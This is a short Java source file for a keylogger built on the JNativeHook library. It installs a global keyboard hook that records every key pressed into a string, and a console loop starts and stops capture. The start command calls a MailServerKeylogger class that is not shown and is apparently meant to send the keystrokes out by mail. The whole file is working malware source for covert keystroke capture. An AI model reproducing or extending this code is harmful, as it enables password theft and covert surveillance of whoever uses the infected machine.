import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.Scanner;

public class Main implements NativeKeyListener {
    static private String keyloggerResult = "";

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
//        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        keyloggerResult += NativeKeyEvent.getKeyText(e.getKeyCode()) + " ";
        NativeKeyListener.super.nativeKeyPressed(e);
    }

    public static void main(String[] args) throws IOException, NativeHookException {
        System.out.println("Hello World");
        Main main = new Main();
        GlobalScreen.registerNativeHook();

        while (true) {
            Scanner myObj = new Scanner(System.in);
            String cur = myObj.nextLine();

            if (cur.equals("start")) {
                MailServerKeylogger.getInstance().startKeylogger();
//                GlobalScreen.addNativeKeyListener(main);
            }
            else if (cur.equals("stop")){
                System.out.println(MailServerKeylogger.getInstance().getKeyloggerResult());
//                GlobalScreen.removeNativeKeyListener(main);
//                System.out.println(keyloggerResult);
//                keyloggerResult = "";
            }
        }


    }
}